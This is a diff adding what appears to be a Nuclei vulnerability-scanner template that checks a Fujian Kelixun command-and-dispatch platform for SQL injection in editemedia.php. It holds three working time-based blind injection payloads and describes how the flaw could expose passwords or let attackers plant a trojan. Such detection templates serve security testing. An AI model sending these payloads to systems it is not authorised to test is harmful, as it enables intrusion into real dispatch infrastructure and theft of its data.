@@ -1,0 +1,24 @@
+id: klx-editemedia-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 福建科立讯通信指挥调度管理平台 down_file.php、pwd_update.php、editemedia.php、get_extension_yl.php、get_extension_yl.php等接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F2-11%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1-%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-SQL?id=f2-11%e7%a6%8f%e5%bb%ba%e7%a7%91%e7%ab%8b%e8%ae%af%e9%80%9a%e4%bf%a1-%e6%8c%87%e6%8c%a5%e8%b0%83%e5%ba%a6%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0-sql
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/client/editemedia.php?enterprise_uuid=1%27%20AND%20(SELECT%203257%20FROM%20(SELECT(SLEEP(3)))JPVs)%20AND%20%27gDyM%27=%27gDyM"
+      - "{{BaseURL}}/api/client/editemedia.php?enterprise_uuid=1%27%20AND%20(SELECT%203257%20FROM%20(SELECT(SLEEP(6)))JPVs)%20AND%20%27gDyM%27=%27gDyM"
+      - "{{BaseURL}}/api/client/editemedia.php?enterprise_uuid=1%27%20AND%20(SELECT%203257%20FROM%20(SELECT(SLEEP(9)))JPVs)%20AND%20%27gDyM%27=%27gDyM"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"      
